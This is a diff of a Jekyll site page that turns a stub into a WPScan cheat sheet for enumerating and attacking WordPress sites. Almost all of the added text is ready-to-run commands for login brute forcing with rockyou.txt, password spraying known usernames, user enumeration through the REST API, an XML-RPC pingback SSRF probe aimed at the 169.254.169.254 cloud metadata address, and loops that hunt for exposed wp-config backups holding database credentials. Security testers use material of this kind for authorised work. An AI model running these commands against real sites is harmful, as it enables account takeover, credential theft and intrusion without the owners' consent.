@@ -1,26 +1,76 @@
 ---
-title: wpscan
+title: WPScan
 layout: default
 permalink: /wpscan/
 ---
 
-<div class="home">
+<div class="wrapper">
   <div class="page-heading">
-    <h2 class="page-title">WPSCAN</h2>
+    <h1 class="page-title">wpscan</h1>
+    <p class="page-intro">Enumerating and attacking WordPress sites with the WPScan toolkit.</p>
   </div>
-  <div class="about">
-    <div class="container-face">
-      <img class="face" src="{{site.baseurl}}/assets/img/{% if site.pic %}{{ site.pic }}{% else %}github.jpg{% endif %}" alt="">
-    </div>
-    <h2 class="tagline">{% if site.tagline %}{{site.tagline}}{% else %}{% endif %}</h2>
-    <div class="about-description">
-      wpscan how to.
-      </div>
-    <div class="contact-contaiver">
-   
-         <script src="https://gist.github.com/random-robbie/aa3923d77dcbe3e7a0ccbce408f9cad5.js"></script>
-        <br><br>
-      <script src="https://gist.github.com/random-robbie/77892fd124ed325b1bdff9a9c700000d.js"></script>
-    </div>
+
+  <div class="post-content" style="max-width: 860px;">
+
+    <h2>$ Find vulnerable plugins, themes and configs</h2>
+    <p>Scan a target for vulnerable plugins (vp), vulnerable themes (vt), config backups (cb) and database exports (dbe). The <code>mixed</code> plugin detection mode combines both passive and aggressive discovery, so results are far more complete than the default.</p>
+    <pre><code>docker run -it --rm wpscanteam/wpscan --url https://example.com --api-token YOURAPIKEY --disable-tls-checks --rua -e vp,vt,cb,dbe --plugins-detection mixed</code></pre>
+
+    <h2>$ Brute force WordPress logins</h2>
+    <p>Enumerate users first (<code>-e u</code>), then spray a wordlist against the login form. Mounting the current directory keeps the wordlist inside the container.</p>
+    <pre><code>wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+sudo docker run -v $(pwd):/wordlists/ -it --rm wpscanteam/wpscan --url https://website.com --rua -e u --users-detection mixed --password-attack wp-login -P /wordlists/rockyou.txt --disable-tls-checks</code></pre>
+
+    <h2>$ Enumerate users without an API token</h2>
+    <p>User enumeration needs no API key and often leaks admin usernames you can target later.</p>
+    <pre><code>docker run -it --rm wpscanteam/wpscan --url https://example.com -e u --users-detection mixed</code></pre>
+    <p>Manually, the REST API usually gives the same answer without any tooling:</p>
+    <pre><code>curl -s https://example.com/wp-json/wp/v2/users | jq '.[].slug'</code></pre>
+
+    <h2>$ Password spray known usernames</h2>
+    <p>Once you have a shortlist of real users, try a small, high-quality password list instead of a huge one — it is quieter and faster.</p>
+    <pre><code># small list, one candidate per line
+cat &gt; passwords.txt &lt;&lt;'EOF'
+Password1
+Summer2023!
+Welcome123
+EOF
+docker run -it --rm wpscanteam/wpscan --url https://example.com \
+  --usernames admin,editor,j.smith \
+  --passwords /wordlists/passwords.txt \
+  --password-attack wp-login --rua</code></pre>
+
+    <h2>$ Abuse XML-RPC pingback</h2>
+    <p><code>xmlrpc.php</code> is enabled by default on most installs and supports the <code>pingback.ping</code> method, which turns the target into a SSRF pivot and can be used for DDoS amplification.</p>
+    <pre><code># check which XML-RPC methods are exposed
+curl -s -X POST https://example.com/xmlrpc.php -d '&lt;?xml version="1.0"?&gt;&lt;methodCall&gt;&lt;methodName&gt;system.listMethods&lt;/methodName&gt;&lt;/methodCall&gt;'
+# pingback SSRF probe against an internal host
+curl -s -X POST https://example.com/xmlrpc.php -d '&lt;?xml version="1.0"?&gt;&lt;methodCall&gt;&lt;methodName&gt;pingback.ping&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http://169.254.169.254/latest/meta-data/&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;https://example.com/?p=1&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;'
+# WPScan can also try the xmlrpc password attack
+docker run -it --rm wpscanteam/wpscan --url https://example.com --password-attack xmlrpc -U admin -P /wordlists/rockyou.txt</code></pre>
+
+    <h2>$ Hunt for wp-config backups and exposed files</h2>
+    <p>Editors and admins routinely leave copies of <code>wp-config.php</code> behind; they contain database credentials and auth salts.</p>
+    <pre><code>for f in wp-config.php.bak wp-config.php~ wp-config.php.old wp-config.php.save wp-config.php.orig wp-config.bak wp-config.old; do
+  code=$(curl -s -o /dev/null -w '%{http_code}' "https://example.com/$f")
+  [ "$code" = "200" ] &amp;&amp; echo "[+] Found: /$f"
+done
+# also probe common backup archives of the whole site
+for f in backup.zip backup.tar.gz site.zip wp-content/backup-db; do
+  code=$(curl -s -o /dev/null -w '%{http_code}' "https://example.com/$f")
+  [ "$code" = "200" ] &amp;&amp; echo "[+] Found: /$f"
+done</code></pre>
+
+    <h2>$ Theme detection and useful extra enumeration</h2>
+    <p>Detect the active theme and parent themes, plus timthumb and popular plugins — old themes are as exploitable as old plugins.</p>
+    <pre><code># enumerate themes (vt adds the vulnerable-theme check)
+docker run -it --rm wpscanteam/wpscan --url https://example.com -e vt,cb --plugins-detection mixed --api-token YOURAPIKEY
+# quick manual fingerprint
+curl -s https://example.com/ | grep -oE 'wp-content/themes/[^/]+'
+# other useful enumeration options
+#   -e ap  all plugins        -e at  all themes
+#   -e cb  config backups     -e dbe db exports
+#   -e u   users              --rua  random user agent</code></pre>
+
   </div>
 </div>
